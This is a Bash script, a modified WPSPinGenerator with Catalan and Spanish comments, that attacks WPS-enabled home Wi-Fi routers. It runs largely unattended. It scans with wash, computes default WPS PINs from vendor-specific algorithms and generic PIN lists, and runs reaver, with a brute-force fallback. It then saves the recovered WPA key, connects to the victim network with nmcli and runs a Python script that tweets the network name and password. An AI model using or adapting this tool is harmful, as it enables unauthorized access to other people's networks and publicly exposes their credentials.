#!/bin/bash

#
# AVÍS
# modificació del codi original, codi original de www.seguridadwirless.net
# modificació per fer que l'execució sigui pràcticament autònoma, i que al
# acabar es conecti a la xarxa wifi, i envii un tweet amb l'ESSID i la contrassenya
#
# data versió: 2015/01/01
# Arnau
#


# www.seguridadwireless.net
#
# Búsqueda de redes con WPS activo (wash), cálculo del posible PIN por defecto
# y prueba del PIN calculado (reaver)

#######################################
#############  CHANGELOG  #############
#######################################
# 30/12/2014  VERSION 3.2
# - Solucionado bug en la cuenta atrás mientras escanea en busca de objetivos
#
# 02/03/2014  VERSION 3.1
# - Solucionado bug al buscar el pin genérico en la base de datos cuando el objetivo tiene el ESSID cambiado.
#
# 26/02/2014  VERSION 3.0
# - Solucionado bug al buscar el pin genérico en la base de datos cuando hay 2 macs iguales.
# - Se limita el tiempo de espera para comprobar actualizaciones para que no se quede el script pillado si el server tarda en responder
#
# 11/02/2014  VERSION 2.9
# - Añadia función de actualizar la base de datos al inicio del script (solo si hay internet lógicamente)

# 07/02/2014  VERSION 2.8
# - Las Orange-XXXX estaban "baneadas" por coincidir algunas macs con las VodafoneXXXX y daban falso positivo,
#   ahora solo se banean si el keygen es EasyboxWPS, ya que algunas son comatibles con el algoritmo ComputePIN

# 03/02/2014  VERSION 2.7
# - Reaparado un bug al mostrar el PIN en algunas ocasiones.
#######################################
#######################################

# Variables globales
SCRIPT="WPSPinGenerator"
VERSION="3.2"
KEYS="$HOME/swireless/$SCRIPT/Keys"
TMP="/tmp/$SCRIPT"
MACs_DB="$(cat "$HOME/swireless/patrones_conocidos.txt" 2>/dev/null|grep -v "^#")"

CheckPatronesConocidos() {

	BuscarESSID() {

		while read LINEA; do

			DB_ESSID="$(echo "$LINEA"|awk '{print $4}')"
			CHECKESSID="$(echo "$DB_ESSID"|tr -d '?')"
			if [ ${#DB_ESSID} -eq ${#ESSID} -a "$CHECKESSID" = "${ESSID:0:${#CHECKESSID}}" ]; then

				KEYGEN="$(echo "$LINEA"|awk '{print $3}')"
				[ "$KEYGEN" = "PINGENERICO" ] && PINGENERICO="$(echo "$LINEA"|rev|awk -F'\t' '{print $1}'|rev)"
				SOPORTADA="SI"
				break
			fi
		done <"$TMP/DB_CHECK.txt"
	}

	unset SOPORTADA KEYGEN PINGENERICO

	[ "$(echo "$ESSID"|grep -x "^WiFi[0-9]*$")" ] && [ ${#ESSID} -eq 10 ] && return
	#[ "${ESSID:0:3}" = "ONO" ] && [ ${#ESSID} -eq 7 ] && [ ! "$(echo "${ESSID:3:7}"|grep -x "^[[:xdigit:]]*0$")" ] && return

	DB_CHECK1="$(echo "$MACs_DB"|grep "^??:??:??"|grep "WPS")"
	echo "$DB_CHECK1" >"$TMP/DB_CHECK.txt"
	BuscarESSID

	if [ ! "$SOPORTADA" ]; then

		DB_CHECK2="$(echo "$MACs_DB"|grep "^${BSSID:0:8}"|grep "WPS")"
		if [ "$DB_CHECK2" ]; then

			echo "$DB_CHECK2" >"$TMP/DB_CHECK.txt"
			BuscarESSID

			[ ! "$SOPORTADA" ] && SOPORTADA="¿?" && KEYGEN="$(echo "$DB_CHECK2"|head -1|awk '{print $3}')" && \
			[ "$KEYGEN" = "PINGENERICO" ] && PINGENERICO="$(echo "$DB_CHECK2"|head -1|rev|awk -F'\t' '{print $1}'|rev)"
		fi
	fi

	[ "$(echo "$ESSID"|grep -x "^Orange-[[:xdigit:]]*$")" ] && [ ${#ESSID} -eq 11 ] && [ "$KEYGEN" = "EasyboxWPS" ] && return

	if [ ! "$SOPORTADA" ]; then

		if [ "$(echo "$ESSID"|grep "^vodafone")" ] && [ ${#ESSID} -eq 12 ]; then

			KEYGEN="ComputePIN"
			SOPORTADA="¿?"

		elif [ "$(echo "$ESSID"|grep "^MOVISTAR_")" ] && [ ${#ESSID} -eq 13 ]; then

			PINGENERICO="12345670 71537573"
			SOPORTADA="¿?"
		fi
	fi

	KEYGEN_WPS[$countWPS]="$KEYGEN"
	PIN_GENERICO[$countWPS]="$PINGENERICO"
	SOPORTADA_WPS[$countWPS]="$SOPORTADA"
}

###################################################################
###################################################################
# Yeah Niroz was here, computePIN by ZaoChunsheng, C portado a bash
function wps_pin_checksum() {

pin=$(echo ${pin}+0|bc -l) # Le quitamos los ceros de la izquierda para que salga bien el checksum

acum=0
PIN_p2=0
while [ $pin -gt 0 ]; do
	acum=$(($acum + (3 * ($pin % 10))))
	pin=$(($pin / 10))
	acum=$(($acum + ($pin % 10)))
	pin=$(($pin / 10))
done
result=$(((10 - ($acum % 10)) % 10))
PIN_p2=$(($result % 10000000))
}

# Algoritmos del script WPSPIN
WPSPIN() {
CHECKESSID=$(echo $ESSID | cut -d '-' -f1)
#DEBUTBSSID=$(echo $BSSID | cut -d ":" -f1,2,3)
#CHECKBSSID=$(echo $DEBUTBSSID | tr -d ':')


#segunda parte de bssid xx:xx:xx:XX:XX:XX
BSSID_p2=$(echo $BSSID | cut -d ':' -f4-)

#6 últimos dígitos de bssid sin ':'
MAC=$(echo $BSSID_p2 | tr -d ':')

#MAC = 6 últimos dígitos hex de la mac
hex=$(echo -n $MAC | tr [:lower:] [:upper:])  #minúsculas a mayúsculas

#PIN_p1 primera parte del pin, PIN_p2 segunda parte del pin
PIN_p1=$(echo "ibase=16; $hex"|bc)  #convertir hex a decimal
#PIN_p1=$(printf '%d' 0x$hex) #convertir hex a decimal, otra forma

PIN_p1a=$(($PIN_p1 % 10000000))  # elimina dígito más significativo de PIN_p1
#PIN_p1b=$((($PIN_p1 % 10000000)+8))  # elimina dígito más significativo y suma 8
#PIN_p1c=$((($PIN_p1 % 10000000)+14))

pin=$PIN_p1a
wps_pin_checksum
PINWPS=$PIN_p1a$PIN_p2

# Rellenamos con ceros a la izquierda hasta que el número sea de 8 dígitos
while [ ${#PINWPS} -lt 8 ]; do PINWPS=0${PINWPS}; done

#pin=$PIN_p1b
#wps_pin_checksum
#PINWPS2=$(printf "%07d%d" "$PIN_p1b" "$PIN_p2")

#pin=$PIN_p1c
#wps_pin_checksum
#PINWPS3=$(printf "%07d%d" "$PIN_p1c" "$PIN_p2")
}
###################################################################
###################################################################

###################################################################
###################################################################
# Pin generator for FTE-XXXX (HG552c), original algorithm by kcdtv

FTE_Keygen() {
#FIN_ESSID=XXXX <- FTE-XXXX
  FIN_ESSID=$(echo $ESSID | cut -d '-' -f2)

#nos quedamos con el 4 par de la bssid xx:xx:xx:XX:xx:xx
  PAR=$(echo $BSSID_p2 | cut -d ':' -f1)
  PAR=$(echo $PAR | tr -d ':')

#hex=AB1234, donde essid es FTE-1234 y bssid es xx:xx:xx:AB:xx:xx
  hex=$(echo $PAR$FIN_ESSID)

  MAC=$(printf '%d' 0x$hex) #hex to dec

  PIN_p1=$((($MAC % 10000000)+7))  # elimina dígito más significativo de MAC y +7

  pin=$PIN_p1
  wps_pin_checksum
  PINWPS=$PIN_p1$PIN_p2

  # Rellenamos con ceros a la izquierda hasta que el número sea de 8 dígitos
  while [ ${#PINWPS} -lt 8 ]; do PINWPS=0${PINWPS}; done
}
###################################################################
###################################################################


easybox_wps() {
###################################################
#
# Generador de clave WPA y PIN WPS de VodafoneXXXX
# Escrito en bash por geminis_demon - www.seguridadwireless.net
# Algoritmo descubierto por Stefan Viehböck
# Gracias a Coeman76 por explicar del funcionamiento del algoritmo
#
##################################################################

# Función que convierte de hex a decimal
hex2dec() {
echo $1|sed 's,\(..\)\(..\)\(..\)\(..\),\4\3\2\1,g'|(read hex;echo $((0x${hex})))
}

# Cojemos los pares 5 y 6 del bssid
PAR5=$(echo $BSSID|cut -d':' -f5)
PAR6=$(echo $BSSID|cut -d':' -f6)

# Concatenamos los pares 5 y 6 y los convertimos a decimal para sacar el serial
SERIAL=$(hex2dec ${PAR5}${PAR6})

# Rellenamos con ceros a la izquierda hasta que el número sea de 5 dígitos
while [ ${#SERIAL} -lt 5 ]; do SERIAL=0${SERIAL}; done

# Cojemos los 4 últimos dígitos del serial
SERIAL2=$(echo $SERIAL|cut -c2)
SERIAL3=$(echo $SERIAL|cut -c3)
SERIAL4=$(echo $SERIAL|cut -c4)
SERIAL5=$(echo $SERIAL|cut -c5)

# Convertimos cada digito de los pares 4 y 5 a decimal
DEC1=$(hex2dec $(echo $PAR5|cut -c1))
DEC2=$(hex2dec $(echo $PAR5|cut -c2))
DEC3=$(hex2dec $(echo $PAR6|cut -c1))
DEC4=$(hex2dec $(echo $PAR6|cut -c2))

# Hacemos la suma para obtener los 2 números maestros
MAESTRO1=$(((${SERIAL2}+${SERIAL3}+${DEC3}+${DEC4})%16))
MAESTRO2=$(((${SERIAL4}+${SERIAL5}+${DEC1}+${DEC2})%16))

# Obtenemos los valores del PIN mediante formulas XOR
PIN1=$((${MAESTRO1}^${SERIAL5}))
PIN2=$((${MAESTRO1}^${SERIAL4}))
PIN3=$((${MAESTRO2}^${DEC2}))
PIN4=$((${MAESTRO2}^${DEC3}))
PIN5=$((${DEC3}^${SERIAL5}))
PIN6=$((${DEC4}^${SERIAL4}))
PIN7=$((${MAESTRO1}^${SERIAL3}))

# Concatenamos los valores y los convertimos a exadecimal
PIN=$(printf "%x%x%x%x%x%x%x\n" $PIN1 $PIN2 $PIN3 $PIN4 $PIN5 $PIN6 $PIN7)

# Convertimos las minusculas en mayusculas
PIN=$(echo $PIN|tr '[:lower:]' '[:upper:]')

# Convertimos los valores a decimal
PIN=$(hex2dec $PIN)

# Nos quedamos con los 7 últimos dígitos
PIN=$(echo $PIN|rev|cut -c1-7|rev)

# Añadimos el útimo digito calculado por el CheckSum
pin=$PIN
wps_pin_checksum
PINWPS=$PIN$PIN_p2

# Rellenamos con ceros a la izquierda hasta que el número sea de 8 dígitos
while [ ${#PINWPS} -lt 8 ]; do PINWPS=0${PINWPS}; done
}

# Comprobar si la interface está conectada a internet
CheckETH() {
clear
if [ ! "$(iwconfig $tarjselec|grep "Not-Associated")" ]; then
  echo
  echo "[0;31mPer evitar errors, la interfície \"$tarjselec\" no ha d'estar conectada a internet! [0m"
  echo ""
  echo "Presiona ENTER per tornar a l'inici"
  read junk
  menu
fi
}

# Funcion de seleccionar el objetivo a atacar, la mayor parte del codigo ha sido sacado del script Multiattack de M.K
SeleccionarObjetivo() {
i=0
redesWPS=0
while read BSSID Channel RSSI WPSVersion WPSLocked ESSID;do
  longueur=${#BSSID}
  if [ $longueur -eq 17 ] ; then
    i=$(($i+1))
    WPSbssid[$i]=$BSSID
    WPSCHANNEL[$i]=$Channel
    WPSessid[$i]="$ESSID"
    PWR[$i]=$RSSI
    LOCK[$i]=$WPSLocked
  fi
  redesWPS=$i
done <"$TMP/wash_capture"
if  [ "$redesWPS" = "0" ];then
  clear
  echo ""
  echo ""
  echo "                        * * *     A T E N C I Ó     * * *                "
  echo ""
  echo "                          no s'ha trobat cap xarxa "
  echo "                          amb WPS activat"
  echo ""
  echo "                          apreta ENTER per tornar a començar"
  read junk
  InfoAP="OFF"
  menu
else
  clear
  echo ""
  echo "            [1;32mLes següents xarxes són susceptibles a un atac amb REAVER[0m"
  echo ""
  echo -n "            BSSID       Algoritme  Genéric  Lock  Senyal  Canal  ESSID"
  [ "$FABRICANTES" = "1" ] && echo -en "\t\tFabricant"
  echo ""
  echo ""
  countWPS=0
  while [ 1 -le $i ]; do
    countWPS=$(($countWPS+1))
    ESSID="${WPSessid[$countWPS]}"
    BSSID=${WPSbssid[$countWPS]}
    PWR=$((${PWR[$countWPS]}+100))
    CHANNEL=${WPSCHANNEL[$countWPS]}
    LOCK=${LOCK[$countWPS]}
    if [ "$LOCK" = "Yes" ]; then LOCK="[0;31mSI[0m"; else LOCK="NO"; fi

    CheckPatronesConocidos
    SOPORTADA_WPS="${SOPORTADA_WPS[$countWPS]}"
    KEYGEN_WPS="${KEYGEN_WPS[$countWPS]}"
    PIN_GENERICO="${PIN_GENERICO[$countWPS]}"

    if [ "$PIN_GENERICO" ]; then

	if [ "$SOPORTADA_WPS" = "SI" ]; then

	    GENERICO="[0;32mSI[0m"
	else
	    GENERICO="[1;33m¿?[0m"
	fi
    else
	GENERICO="NO"
    fi


    if [ "$KEYGEN_WPS" ] && [ "$KEYGEN_WPS" != "PINGENERICO" ]; then

	if [ "$SOPORTADA_WPS" = "SI" ]; then

	    ALGORITMO="[0;32mSI[0m"
	else
	    ALGORITMO="[1;33m¿?[0m"
	fi
    else
	ALGORITMO="NO"
    fi

    WPA_TXT="$(echo "$ESSID")_$(echo $BSSID|tr ':' '-').txt"
    if [ -f "$TMP/$WPA_TXT" ]; then
      RESALTAR="\E[7m"
    else
      RESALTAR=""
    fi

    if [ "$FABRICANTES" = "1" ]; then
      FABRICANTE="$(cat /etc/aircrack-ng/airodump-ng-oui.txt|grep -m1 "$(echo "${BSSID:0:8}"|tr ':' '-')"|awk -F'\t' '{print $3}')"
      [ ! "$FABRICANTE" ] && FABRICANTE="Desconocido"
      while [ ${#ESSID} -lt 13 ]; do ESSID="$ESSID "; done
      ESSID="${ESSID:0:13}"
      FABRICANTE="${FABRICANTE:0:14}"
    else
      FABRICANTE=""
    fi

    N=$countWPS
    [ $N -lt 10 ] && N=" $N"
    [ $PWR -lt 10 ] && PWR=" $PWR"
    [ $CHANNEL -lt 10 ] && CHANNEL="$CHANNEL "

    echo -e " $N)  ${RESALTAR}$BSSID\E[0m     $ALGORITMO        $GENERICO      $LOCK    $PWR%     $CHANNEL   ${RESALTAR}$ESSID\E[0m  $FABRICANTE"

    i=$(($i-1))
  done
  i=$redesWPS
  echo ""
  echo " v)  Vure/ocultar fabricants "
  echo " 0)  tornar a l'inici "
  echo ""
  echo ""
  echo " --> [1;36mSelecciona una xarxa[0m"
  read WPSoption
  set -- ${WPSoption}

  if [ "$WPSoption" = "V" -o "$WPSoption" = "v" ]; then
    if [ "$FABRICANTES" = "1" ]; then
      FABRICANTES=""; SeleccionarObjetivo
    else
      FABRICANTES=1; SeleccionarObjetivo
    fi
  elif [ $WPSoption -le $redesWPS ]; then
    if [ "$WPSoption" = "0" ];then
      menu
    fi
    ESSID=${WPSessid[$WPSoption]}
    BSSID=${WPSbssid[$WPSoption]}
    CHANNEL=${WPSCHANNEL[$WPSoption]}
    PIN_GENERICO=${PIN_GENERICO[$WPSoption]}
    KEYGEN_WPS=${KEYGEN_WPS[$WPSoption]}
    clear
  else
    echo " Opció no vàlida... torna a escollir"
    sleep 2
    SeleccionarObjetivo
  fi
fi

InfoAP="ON"
ProbarPINCalculado
}

# Escanear con wash
WashScan() {

[ ! "$WIFI" ] && auto_select_monitor

CheckETH

# Nos aseguramos que que la interface está up para evitar problemas con las ralink
ifconfig $tarjselec up

echo ""
echo " [1;33m--> [1;32m Temps d'escaneig 30s [0m"
  SCANTIME=15

echo ""
echo " [1;33m--> [1;32m Escanejant tots els canals per defecte (de l'1 al 14) [0m"
  SCANCHANNEL=""


sleep 1
tput clear
tput sc

if [ -e "$TMP/wash_capture" ]; then rm -rf "$TMP/wash_capture"; fi
killall wash 2>/dev/null
wash -D -i $WIFI -C $SCANCHANNEL -o $TMP/wash_capture 2>/dev/null
sleep 1
WashPID=$(pgrep wash)

sleep $SCANTIME && kill $WashPID 2>/dev/null &
sleep 1

trap "kill $WashPID" SIGINT

seconds=$SCANTIME
while [ -e /proc/$WashPID ]; do
  seconds=$(($seconds-1))
  sleep 1
  tput rc
  tput ed
  echo "[1;33mEscanejant en busca d'objectius... [1;36m$seconds[0m [1;33msegons (Ctrl+C para aturar)[0m"
  echo ""
  cat $TMP/wash_capture
done

cat "$TMP/wash_capture"|tail +3|sort -k3 -n >"$TMP/wash_capture.new"
mv "$TMP/wash_capture.new" "$TMP/wash_capture"

SeleccionarObjetivo
}

auto_select_monitor() {
#! /bin/bash


#############################################################################################################
# Programa:	monitormode
# Autor:	M.K. Maese Kamara
#
# Detectar tarjetas y montar  en modo monitor

#############################################################################################################


#poner tarjeta en modo monitor AUTOMATICO

clear
t=0
if [ ! "$WIFI" ]; then
> $TEMP/wireless.txt
cards=`airmon-ng|cut -d ' ' -f 1 | awk {'print $1'} |grep -v Interface #|grep -v  mon   `
echo $cards >> $TEMP/wireless.txt
tarj1=`cat $TEMP/wireless.txt | cut -d  ' ' -f 1  | awk  '{print $1}'`
tarj2=`cat $TEMP/wireless.txt | cut -d  ' ' -f 2  | awk  '{print $1}'`
rm  -rf $TEMP/wireless.txt

if  [ ! "$tarj1" ]; then
clear
echo "                  * * *     A T E N C I Ó     * * *                "
	echo ""
	echo "    No s'ha trobat cap targeta wifi a l'equip"
	echo ""
	echo "    Pulsa ENTER per tornar a l'inici"
read yn
menu
fi

if [ "$tarj1" = "$tarj2" ]; then
tarj2=""
fi

tarjselec=$tarj1

if [ "$tarj2" ] ;then
echo
echo
echo "      s'han trobat les següents targetes wifi a l'equip"
echo

airmon-ng |awk 'BEGIN { print "Tarjeta  Chip              Driver\n------- ------------------ ----------" } \
  { printf "%-8s %-8s %-1s %10s\n", $1, $2, $3, $4 | "sort -r"}' |grep -v Interface  |grep -v Chipset

echo "      Selecciona una per utilitzarla en mode monitor"
echo

tarj_wire=""
tarjselec=""
function selectarj {
select tarjselec in `airmon-ng | awk {'print $1 | "sort -r"'} |grep -v Interface |grep -v Chipset  `; do
break;
done

if [ ! "$tarjselec" ]; then
echo "  La opció seleccionada no és vàlida"
echo "  Introdueix una opció vàlida..."
selectarj
fi
}

if [ ! "$tarjselec" ]; then
selectarj
fi

echo ""
echo "Interfície seleccionada: $tarjselec"

# Limpieza de interface
ifconfig $tarjselec down >/dev/null
ifconfig $tarjselec up >/dev/null

# Comprobación de interface
CheckETH

fi
else
echo
fi
tarjmonitor=${tarjselec:0:3}
if [ "$tarjmonitor" != "mon" ] && [ ! "$WIFI" ];then
echo ""
echo ""
echo "          s'està montant la targeta en mode monitor, espera..."
echo ""
sleep 1

airmon-ng start $tarjselec >/dev/null
cards=`airmon-ng|cut -d ' ' -f 1 |awk {'print $1 | "sort -d"'} |grep -v Interface |grep -v wlan`
largo=${#cards}
final=$(($largo-4))
WIFI=${cards:final}
echo  " $WIFI ----> S'utilitzarà en mode monitor."
sleep 2

else
if [ ! "$WIFI" ];then
WIFI="$tarjselec"

echo ""
echo  " $WIFI ----> S'utilitzarà en mode monitor."
sleep 2
fi
fi
clear
}

#Función de desmontar tarjeta y salir, sacada de el script Multiattack de M.K.
function DESMONTAR_tarj_y_salir {
if [ "$WIFI" ]; then
clear
echo ""
  echo ""
  echo ""
  echo "	####################################################################"
  echo "	###                                                              ###"
  echo "	###       ¿Vols desmuntar la targeta abans de sortir?            ###"
  echo "	###                                                              ###"
  echo "	###        (n) no   -> sortir sense desmuntar                    ###"
  echo "	###        (m) Menú -> tornar al menú principal                  ###"
  echo "	###        ENTER    -> Desmuntar y Sortir                        ###"
  echo "	###                                                              ###"
  echo "	###                                                              ###"
  echo "	####################################################################"
  echo ""
  echo ""
read salida
set -- ${salida}

if [ "$salida" = "m" ]; then
menu
fi
if [ "$salida" = "n" ]; then
  echo ""
echo "         Fins aviat..."
sleep 2
clear
exit
fi
echo "$WIFI Ha sigut desmuntada"
airmon-ng stop $WIFI >/dev/null
fi
  echo ""
echo "         Fins aviat..."
sleep 2
clear
 exit

}

ParsearReaver() {
echo
WPA_KEY="$(tail $TMP/reaver_capture|grep "WPA PSK:"|cut -d"'" -f2-|rev|cut -d"'" -f2-|rev)"
if [ "$WPA_KEY" ]; then

  if [ -f "/etc/reaver/$(echo "$BSSID"|tr -d ':').wpc.bak" ]; then
    rm -f "/etc/reaver/$(echo "$BSSID"|tr -d ':').wpc.bak"
  fi

  PIN="$(tail $TMP/reaver_capture|grep "WPS PIN:"|cut -d"'" -f2-|rev|cut -d"'" -f2-|rev)"
  WPA_TXT="$(echo "$ESSID")_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  "$TMP/$WPA_TXT"
  echo "BSSID: $BSSID" >> "$TMP/$WPA_TXT"
  echo "PIN WPS: $PIN" >> "$TMP/$WPA_TXT"
  echo "CLAU WPA: $WPA_KEY" >> "$TMP/$WPA_TXT"
  nmcli d wifi connect $ESSID password $WPA_KEY iface wlan0
  python enviatuitwifi.py $ESSID $WPA_KEY
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > "$KEYS/$WPA_TXT"
  echo -e "\033[0;32mLa clau ha sigut guardada en \"$KEYS/$WPA_TXT\"\E[0m"

else

  if [ -f "/etc/reaver/$(echo "$BSSID"|tr -d ':').wpc.bak" ]; then
    mv "/etc/reaver/$(echo "$BSSID"|tr -d ':').wpc.bak" "/etc/reaver/$(echo "$BSSID"|tr -d ':').wpc"
  fi

  echo "[1;31mNo ha sigut possible trobar la clau wpa.[0m"

fi
echo ""
echo "Presiona enter per tornar al menú"
read junk
menu
}

ProbarPINCalculado() {

LanzarReaver() {

killall reaver 2>/dev/null
reaver -D -i $WIFI -b $BSSID -c $CHANNEL -a -n -g 1 -p $PINWPS -vv -o $TMP/reaver_capture 2>/dev/null
sleep 1
ReaverPID=$(pgrep reaver)
trap "kill $ReaverPID" SIGINT
tail -F $TMP/reaver_capture --pid=$ReaverPID

WPA_KEY="$(tail $TMP/reaver_capture|grep "WPA PSK:"|cut -d"'" -f2-|rev|cut -d"'" -f2-|rev)"
if [ ! "$WPA_KEY" ]; then
	if [ "$(tail $TMP/reaver_capture|grep "Quitting after 1")" ]; then
		echo -e "[-] \033[0;31mPIN incorrecte\E[0m\n"
		sleep 3
		clear
	else
		echo -e "\n\033[0;31mEl procés s'ha aturat, no s'ha pogut provar el PIN\E[0m\n "
		sleep 3
		SeleccionarObjetivo
	fi
fi
}

ProbarGenerico() {
Y=$(echo "$PIN_GENERICO"|tr ' ' '\n'|wc -l)
X=0
for PINWPS in $PIN_GENERICO; do
	X=$(($X+1))
	echo -e "\033[1;33mPovant amb el PIN genéric $X/$Y... (Ctrl+C per aturar)\E[0m\n "
	LanzarReaver
	[ "$WPA_KEY" ] && break
done
}

ProbarComputePIN() {
WPSPIN
echo -e "\033[1;33mPovant amb algorite ComputePIN... (Ctrl+C per aturar)\E[0m\n "
LanzarReaver
}

ProbarEasyboxWPS() {
easybox_wps
echo -e "\033[1;33mPovant amb EasyboxWPS... (Ctrl+C per aturar)\E[0m\n "
LanzarReaver
}

ProbarFTE_Keygen() {
FTE_Keygen
echo -e "\033[1;33mPovant amb FTE_Keygen... (Ctrl+C per aturar)\E[0m\n "
LanzarReaver
}

[ ! "$WIFI" ] && auto_select_monitor

CheckETH

# Nos aseguramos que que la interface está up para evitar problemas con las ralink
ifconfig $tarjselec up

if [ -f "/etc/reaver/$(echo "$BSSID"|tr -d ':').wpc" ]; then
  cp "/etc/reaver/$(echo "$BSSID"|tr -d ':').wpc" "/etc/reaver/$(echo "$BSSID"|tr -d ':').wpc.bak"
else
  touch "/etc/reaver/$(echo "$BSSID"|tr -d ':').wpc.bak"
fi

WPA_KEY=""
PINWPS=""

[ "$PIN_GENERICO" ] && ProbarGenerico

if [ "$KEYGEN_WPS" = "FTE_Keygen" ]; then

	[ ! "$WPA_KEY" ] && ProbarFTE_Keygen
	[ ! "$WPA_KEY" ] && ProbarComputePIN
	[ ! "$WPA_KEY" ] && ProbarEasyboxWPS

elif [ "$KEYGEN_WPS" = "EasyboxWPS" ]; then

	[ ! "$WPA_KEY" ] && ProbarEasyboxWPS
	[ ! "$WPA_KEY" ] && ProbarComputePIN

else
	[ ! "$WPA_KEY" ] && ProbarComputePIN
	[ ! "$WPA_KEY" ] && ProbarEasyboxWPS
fi

ParsearReaver
}

FuerzaBruta() {

[ ! "$WIFI" ] && auto_select_monitor

CheckETH

# Nos aseguramos que que la interface está up para evitar problemas con las ralink
ifconfig $tarjselec up

echo -e "\033[1;33mLlançant atac de força bruta... (Ctrl+C per aturar)\E[0m\n "

killall reaver 2>/dev/null
reaver -D -i $WIFI -b $BSSID -c $CHANNEL -a -n -vv -o $TMP/reaver_capture 2>/dev/null
sleep 1
ReaverPID=$(pgrep reaver)
trap "kill $ReaverPID" SIGINT
tail -F $TMP/reaver_capture --pid=$ReaverPID

ParsearReaver
}

ActualizarBD() {

	DB_LOCAL="$(cat "$HOME/swireless/patrones_conocidos.txt" 2>/dev/null|grep "^# VERSION [0-9]*$"|awk '{print $3}')"
	DB_REMOTA="$(timeout -s SIGTERM 3 curl -s "http://downloadwireless.net/scripts-live/patrones_conocidos.txt"|grep "^# VERSION [0-9]*$"|awk '{print $3}')"

	[ ! "$DB_REMOTA" ] && return

	if [ ! "$DB_LOCAL" ] || [ $DB_LOCAL -lt $DB_REMOTA ]; then

		[ ! -d "$HOME/swireless" ] && rm -rf "$HOME/swireless" && mkdir -p "$HOME/swireless"
		[ ! "$(timeout -s SIGTERM 3 curl -s "http://downloadwireless.net/scripts-live/patrones_conocidos.txt" >"$HOME/swireless/patrones_conocidos.txt")" ] && return
		DB_LOCAL=$DB_REMOTA

		echo
		echo " - La base de dades ha sigut actualitzada a la versió $DB_LOCAL"
		echo

		if [ "$(which dir2xzm)" ]; then

			while true; do

				read -p " - ¿Guardar en un módulo XZM? (s/n) " SN

				if [ "$SN" = "S" -o "$SN" = "s" ]; then

					mkdir -p "$TMP/patrones-conocidos-$DB_LOCAL-noarch-1sw$HOME/swireless"
					cp -f "$HOME/swireless/patrones_conocidos.txt" "$TMP/patrones-conocidos-$DB_LOCAL-noarch-1sw$HOME/swireless"
					dir2xzm "$TMP/patrones-conocidos-$DB_LOCAL-noarch-1sw" "$HOME/Desktop/patrones-conocidos-$DB_LOCAL-noarch-1sw.xzm" >/dev/null 2>&1

					echo
					echo " - S'ha creat un mòdul a $HOME/Desktop/patrones-conocidos-$DB_LOCAL-noarch-1sw.xzm"
					echo
					break

				elif [ "$SN" = "N" -o "$SN" = "n" ]; then

					break
				fi

				echo -en "\033[1A"
				tput ed
			done
		fi

		echo " - Presiona qualsevol tecla per continuar"
		read -sn1
	fi
}

# Menú principal
menu() {
clear
echo "[1;34m  AVÍS"
echo "[1;35m  modificació del codi original, codi original de www.seguridadwirless.net"
echo "[1;36m  modificació per fer que l'execució sigui pràcticament autònoma, i que al"
echo "[1;36m  acabar es conecti a la xarxa wifi, i envii un tweet amb l'ESSID i la contrassenya"
echo "[1;35m  pensat per executar-se sobre linux, amb reaver, wash, aircrack-ng i python instalats"
echo " [0;32m"
echo "  data versió: 2015/01/01"
echo "  Arnau"
echo " ----------------------------------------------------------------- "
echo " VERSIO AUTOMATICA - EN PROVES  ---------------------------------- "
echo " ----------------------------------------------------------------- "
sleep 2
echo "-->  som-hi!"
sleep 1
echo "[0;31m
  __    __               ___ _
 / / /\ \ \____  ___    / _ (_)_ __
 \ \/  \/ /  _ \/ __|  / /_)/ | /_
  \  /\  /| |_) \__ \ / ___/| | | | |
   \/  \/ |  __/|___/ \/    |_|_| |_|  [1;33mGenerator $VERSION[0;31m
          |_|                          www.seguridadwireless.net    "
echo ""
echo " ****************************************************"
echo " * [1;32m<<[0m Based on ZhaoChunsheng work & kcdtv script [1;32m>>[0;31m *"
echo " ****************************************************[0m "
echo " ----------------------------------------------------------------- "
echo " VERSIO AUTOMATICA - EN PROVES  ---------------------------------- "
echo " ----------------------------------------------------------------- "
####################################################################
sleep 1
echo " Versió base de dades: $DB_LOCAL"
echo " ------------------------------------"
sleep 1
WashScan
ProbarPINCalculado
FuerzaBruta
SeleccionarObjetivo
DESMONTAR_tarj_y_salir
}

# Comprobación de usuario
if [ $(id -u) -ne 0 ]; then
 echo -e "\e[1;31m
    has de ser root per executar l'script (sudo su).

    Prueba: sudo bash $0
\e[0m"

 exit 1
fi

# Crear directorios si no existen
if [ ! -d $TMP ]; then mkdir -p $TMP; fi
if [ ! -d $KEYS ]; then mkdir -p $KEYS; fi
if [ -d $HOME/Desktop/Wireless-Keys ]; then
  if [ ! -d $HOME/Desktop/Wireless-Keys/$SCRIPT-keys ]; then
    ln -s $KEYS $HOME/Desktop/Wireless-Keys/$SCRIPT-keys
  fi
fi

# Eliminando interfaces en modo monitor
interfaces=$(iwconfig 2>/dev/null|grep "Mode:Monitor"|awk '{print $1}')
if [ "$interfaces" ]; then
  for monx in $interfaces; do
    airmon-ng stop $monx >/dev/null 2>&1
  done
fi

ActualizarBD
menu
